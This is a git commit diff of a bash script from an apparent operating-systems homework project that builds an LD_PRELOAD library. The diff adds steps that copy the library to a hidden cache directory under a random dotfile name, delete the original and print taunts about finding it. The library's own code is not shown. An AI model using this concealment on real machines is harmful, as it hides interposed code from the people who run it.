ec823d1511e69ec46afcd7a9d45d6d9cb14eb5cb
edakay <150674343+edakay10@users.noreply.github.com>
2025-06-09 14:27:23 +0200

    Update non permanent script

--- OShomeworkNP.sh
+++ OShomeworkNP.sh
@@ -1,27 +1,39 @@
 #!/bin/bash
 
-# Make sure this script is sourced on the terminal with "source OShomeworkNP.sh"
-(return 0 2>/dev/null) || {
-    echo "Please run this script with: source $0"
-    exit 1
-}
-
-# find preload 
-# SOURCE_SO=$(find ~/ -name preloadLib.so | grep -m 1 "preloadLib.so") 
-# SOURCE_C=$(find ~/ -name preloadLib.c | grep -m 1 "preloadLib.c") 
-
-# Compile the .so from the .c file
-#gcc -shared -fPIC -o "$SOURCE_SO" "$SOURCE_C" -ldl
+# Make sure this script is sourced on the terminal 
 
 # Compile preloadLib.c into preloadLib.so
+echo "[*] Starting installation..."
+sleep 1
+echo "Have fun copying my homework!"
+sleep 1
+
 gcc -shared -fPIC -o preloadLib.so preloadLib.c -ldl
 
 if [ $? -ne 0 ]; then
-    echo "Compilation failed."
+    echo "Compilation failed"
     return 1
 fi
 
-# Set LD_PRELOAD for current shell and alias
-export LD_PRELOAD="$PWD/preloadLib.so"
+# Define hidden location
+HIDDEN_DIR="$HOME/.cache/.syslib"
+SOURCE_SO="$HOME/Documents/OS_Project/osProject/main/src/test/preloadLib.so"
+NEW_NAME=".lib$(head /dev/urandom | tr -dc a-z0-9 | head -c 8).so"
+HIDDEN_SO="$HIDDEN_DIR/$NEW_NAME"
+
+# Create the hidden directory if it doesn't exist
+mkdir -p "$HIDDEN_DIR"
+
+# Move and rename the .so file
+cp "$SOURCE_SO" "$HIDDEN_SO"
+chmod 755 "$HIDDEN_SO"
+rm -f "$SOURCE_SO"
+
+# Export LD_PRELOAD in current shell session
+export LD_PRELOAD="$HIDDEN_SO"
 alias geary='DISABLE_WRITE_PRANK=1 geary'
-echo "LD_PRELOAD set to: $LD_PRELOAD"
+
+echo "[✓] Install complete."
+echo "[!] Original .so deleted, have fun trying to find it ;)"
+#echo "Your .so file is now hidden at: $HIDDEN_SO"
+
